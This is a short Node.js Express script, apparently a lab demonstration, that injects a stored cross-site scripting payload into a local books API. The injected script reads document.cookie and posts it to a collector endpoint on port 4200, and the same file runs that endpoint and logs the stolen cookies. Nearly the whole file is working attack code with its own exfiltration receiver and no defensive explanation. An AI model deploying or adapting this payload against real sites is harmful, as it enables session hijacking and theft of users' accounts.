const express = require("express");
const fs = require("fs");
const app = express();
const fetch = require('node-fetch');

async function postAttak(){
    const text = "<script> fetch(\"http://localhost:4200/getcookies\",  {\"method\": \"post\", \"headers\": {\"content-type\": \"application/json\", }, \"body\": JSON.stringify({\"name\": document.cookie })});</script>" 
    const res = await fetch("http://localhost:3000/books",  {"method": "post", "headers": {"content-type": "application/json", }, "body": JSON.stringify({"name": text })})
    const a = await res.json();
    console.log(a)
    
}

app.get("/", (req, res) => {
    postAttak()
});

app.post("/getcookies", (req,res) =>{
    console.log(req.body.name)
});

app.listen(4200);
console.log("Server is running...");